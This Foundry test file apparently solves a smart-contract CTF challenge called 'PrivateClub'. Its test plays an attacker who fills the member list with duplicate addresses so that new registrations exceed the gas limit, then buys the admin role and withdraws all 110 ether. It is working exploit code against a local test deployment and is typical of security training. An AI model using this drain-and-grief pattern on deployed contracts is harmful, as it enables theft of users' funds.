// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/PrivateClub/PrivateClub.sol";

contract PrivateClubHack is Test {
    PrivateClub club;

    address clubAdmin = makeAddr("clubAdmin");
    address adminFriend = makeAddr("adminFriend");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");
    address user4 = makeAddr("user4");
    address hacker = makeAddr("hacker");
    uint blockGasLimit = 120000;

    function setUp() public {
        vm.deal(clubAdmin, 100 ether);
        vm.deal(hacker, 10 ether);
        vm.deal(user2, 10 ether);
        vm.deal(user3, 10 ether);
        vm.deal(user4, 10 ether);
        vm.startPrank(clubAdmin);
        club = new PrivateClub();
        club.setRegisterEndDate(block.timestamp + 5 days);
        club.addMemberByAdmin(adminFriend);
        address(club).call{value: 100 ether}("");
        vm.stopPrank();
        vm.startPrank(user2);
        address[] memory mForUser2 = new address[](1);
        mForUser2[0] = adminFriend;
        club.becomeMember{value: 1 ether}(mForUser2);
        vm.stopPrank();
        vm.startPrank(user3);
        address[] memory mForUser3 = new address[](2);
        mForUser3[0] = adminFriend;
        mForUser3[1] = user2;
        club.becomeMember{value: 2 ether}(mForUser3);
        vm.stopPrank();
    }
    
    address[] private members = [hacker, hacker, hacker];

    function test_attack() public {
        vm.startPrank(hacker);
        // task1: become member of the club and
        // block future registrations (reason: out of gas - block gas limit)
        // solution: 
        for(uint i = 3; i < 8; i++) {
            // the members array contains the duplicate hacker address
            club.becomeMember{value: i * 1 ether}(members);
            // push hacker address into members array until out of gas
            members.push(hacker);
        }
        vm.stopPrank();

        // check - hacker is member
        assertTrue(club.members(hacker));

        // check - user4 can not become member - blockGasLimit
        vm.startPrank(user4);
        address[] memory mForUser4 = new address[](club.membersCount());
        for (uint i = 0; i < club.membersCount(); i++) {
            mForUser4[i] = club.members_(i);
        }
        uint etherAmount = mForUser4.length * 1 ether;
        uint gasleftbeforeTxStart = gasleft();
        club.becomeMember{value: etherAmount}(mForUser4);
        uint gasleftAfterTxStart = gasleft();
        vm.stopPrank();

        assertGt(gasleftbeforeTxStart - gasleftAfterTxStart, blockGasLimit);

        vm.startPrank(hacker);
        // task2: buy admin role and withdraw all ether from the club
        // solution:
        club.buyAdminRole{value: 10 ether}(hacker);
        club.adminWithdraw(hacker, 110 ether);
        vm.stopPrank();

        // check - hacker is owner of club
        assertEq(club.owner(), hacker);
        assertGt(hacker.balance, 110000000000000000000 - 1);
    }
}